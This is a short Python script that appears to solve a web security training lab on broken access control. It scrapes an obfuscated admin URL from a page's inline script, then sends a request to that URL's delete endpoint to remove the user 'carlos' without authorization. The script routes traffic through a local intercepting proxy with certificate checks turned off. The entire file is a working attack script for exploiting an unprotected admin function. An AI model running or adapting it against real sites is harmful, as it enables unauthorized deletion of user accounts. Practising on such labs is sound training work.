import requests
import urllib3
import sys
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http':'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def deleteUser(url):
    res =  requests.get(url, proxies=proxies, verify=False)
    cookie = res.cookies.get_dict().get("session")

    print("(+) Cheking obfuscated admin URL...")
    soup = BeautifulSoup(res.text, 'html.parser')
    admin_instances = soup.find(text=re.compile("/admin"))
    print(admin_instances)
    path = re.search("href', '(.*)'", admin_instances).group(1)
    print(path)

    if res.status_code == 200:
        cookies = { 'session': cookie}
        adminURL = url + path + "/delete?username=carlos"
        print("(+) Admin URL: ", adminURL)
        print("(+) Deleting user carlos...")
        response = requests.get(adminURL,cookies=cookies, proxies=proxies, verify=False)
        if response.status_code == 200:
            print("(+) User Deleted Successfully..!")
        else:
            print("(-) Could not delete user.")
            sys.exit(-1)
    else:
        print("(-) Unable to get website.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(*) Usage: \nSyntax: python file.py <url>\nEg: python file,py www.example.com")
        sys.exit(-1)
    
    url = sys.argv[1]
    deleteUser(url)


if __name__ == '__main__':
    main()